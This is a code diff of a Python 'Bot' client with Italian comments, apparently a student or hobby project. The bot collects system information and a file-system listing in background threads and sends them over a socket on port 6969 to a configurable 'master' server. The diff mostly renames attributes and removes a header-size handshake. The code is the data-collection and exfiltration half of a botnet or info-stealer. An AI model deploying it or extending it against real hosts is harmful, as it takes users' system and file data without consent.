@@ -10,19 +10,19 @@ import threading
 PORT = 6969
 CLIENT = socket.gethostbyname(socket.gethostname())
 FORMAT = 'utf-8'
-MASTER_ADDRESS = 'localhost' # Inserire ip del master
+MASTER_ADDRESS = 'localhost'  # Inserire ip del master
 SUCCESSFUL_RESPONSE = 'ok'
 
 
 class Bot:
     def __init__(self):
-        self.informationScavanger = systemRetrieval.InformationScavanger()
+        self.ScavengerObject = systemRetrieval.InformationScavanger()
+
         self.data_sentence = ''
         self.fileSystem_sentence = ''
 
         self.send_sentence = ''
 
-        self.header_dim = 0
         self.clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         # Thread incaricato del recupero dei dati e del calcolo della loro dimensione.
@@ -31,7 +31,7 @@ class Bot:
         # Thread incaricato dell'effettiva comunicazione con il server.
         self.thread_connection = threading.Thread(target=self.waitForConnection)
 
-        # Thread incaricato.
+        # Thread incaricato del recupero del file system.
         self.thread_fileSystem = threading.Thread(target=self.fileSystemScavange)
 
         self.thread_data.start()
@@ -52,66 +52,39 @@ class Bot:
         while self.thread_data.is_alive():
             sleep(2)
 
-        # 1. Il client comunica la dimensione dei dati al server (il valore da associare come header).
-        #self.sendHeaderDim()
-
-        # 2. Aspetta che il server dia risposta della corretta ricezione.
-        #first_response = ''
-        #while first_response != SUCCESSFUL_RESPONSE:
-        #    first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio.
-
-        # 3. Possiamo ora inviare i dati raccolti in formato .json.
+        # Possiamo ora inviare i dati raccolti in formato .json.
         self.sendToServer()
 
-        # 4. Il Bot attende la fine del thread file system prima di mandare l'header.
+        # Il Bot attende la fine del thread file system prima di mandare i dati.
         while self.thread_fileSystem.is_alive():
             sleep(2)
 
-        # 5.  Il client comunica la dimensione dei dati al server (il valore da associare come header).
-        #self.sendHeaderDim()
-
-        # 6. Aspetta che il server dia risposta della corretta ricezione.
-        #first_response = ''
-        #while first_response != SUCCESSFUL_RESPONSE:
-        #    first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio.
-
-        # 7. Possiamo ora inviare i dati raccolti in formato .json.
+        # Possiamo ora inviare i dati raccolti in formato txt
         self.sendToServer()
 
         self.clientSocket.close()
 
         print("thread_connection terminated.")
 
-
     def dataScavange(self):
         """
         Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale del pacchetto da inviare.
         :return: None
         """
-        inputDict = self.informationScavanger.systemRetrieval()
+        inputDict = self.ScavengerObject.systemRetrieval()
         self.data_sentence = json.dumps(inputDict)
 
         self.send_sentence = self.data_sentence
         self.header_dim = sys.getsizeof(self.send_sentence.encode(FORMAT))
         print("thread_data terminated.")
 
-
     def fileSystemScavange(self):
-        inputSentence = self.informationScavanger.fileSystemRetrival()
+        inputSentence = self.ScavengerObject.fileSystemRetrival()
         self.fileSystem_sentence = inputSentence
         self.send_sentence = self.fileSystem_sentence
         self.header_dim = sys.getsizeof(self.send_sentence.encode(FORMAT))
         print(self.header_dim)
         print("thread_fileSystem terminated.")
-
-
-    def sendHeaderDim(self):
-        """
-        Il client invia al server la dimensione dei dati recuperati.
-        :return: None
-        """
-        self.clientSocket.sendall(str(self.header_dim).encode(FORMAT))
-
 
     def sendToServer(self):
         """
@@ -123,18 +96,13 @@ class Bot:
         try:
             print(sys.getsizeof(self.send_sentence.encode(FORMAT)))
             self.send_message(self.send_sentence.encode(FORMAT))
-
         except BrokenPipeError as error:
-            pass
-
+            print(error)
 
     # TODO: dobbiamo affrontare il problema dell'invio del filesystem dato che le funzioni di send e recv sono cambiate
     def send_message(self, msg):
         msg = struct.pack('>I', len(msg)) + msg
         self.clientSocket.sendall(msg)
-
-
-
 
 
 if __name__ == '__main__':
